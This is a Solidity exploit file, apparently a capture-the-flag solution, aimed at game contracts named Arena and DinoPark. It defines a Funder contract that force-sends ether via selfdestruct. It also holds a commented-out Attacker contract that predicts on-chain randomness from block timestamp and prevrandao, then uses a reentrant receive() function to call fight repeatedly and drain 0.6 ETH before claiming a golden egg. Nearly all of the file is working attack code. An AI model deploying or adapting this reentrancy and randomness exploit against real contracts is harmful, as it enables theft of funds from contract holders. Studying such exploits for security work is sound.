// Exploit.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

// Interfaces for target contracts
interface IArena {
    function fight(uint8 guess, uint8 mode) external;
}

interface IDinoPark {
    function claimGoldenEgg() external;
}

// Simple contract to fund the Arena via selfdestruct
contract Funder {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

// // Main exploit contract
// contract Attacker {
//     IArena public immutable arena;
//     IDinoPark public immutable dinoPark;
//     uint256 public reentrancyCounter = 0;
//     uint8 public luckyRoll;

//     constructor(address _arena, address _dinoPark) {
//         arena = IArena(_arena);
//         dinoPark = IDinoPark(_dinoPark);
//     }

//     function pwn() external {
//         luckyRoll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);
//         require(luckyRoll > 30, "Bad roll, try again in the next block.");
//         // FightMode.Normal is 0
//         arena.fight(luckyRoll, 0);
//     }
    
//     function claim() external {
//         dinoPark.claimGoldenEgg();
//     }

//     receive() external payable {
//         // We need 6 total wins to drain 0.6 ETH.
//         // The initial call is 1, so we need 5 more re-entrant calls.
//         if (reentrancyCounter < 5) {
//             reentrancyCounter++;
//             arena.fight(luckyRoll, 0);
//         }
//     }
// }